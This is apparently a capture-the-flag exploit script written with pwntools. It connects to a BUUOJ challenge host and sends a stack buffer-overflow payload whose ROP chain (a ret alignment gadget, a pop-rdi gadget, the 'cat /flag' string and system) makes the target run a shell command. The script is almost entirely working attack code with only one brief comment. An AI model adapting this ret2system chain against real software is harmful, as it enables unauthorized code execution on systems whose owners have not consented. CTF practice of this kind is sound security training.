```python
from pwn import *
r=remote('node5.buuoj.cn',27057)
elf=ELF('./2')

system=p64(elf.symbols['system'])
catflag=p64(next(elf.search(b'cat /flag')))
rdi=0x400793
ret=0x400501#16位对齐，因为不加打不通

payload=b'a'*0x38+p64(ret)+p64(rdi)+catflag+system
r.sendline(payload)
r.interactive()
```
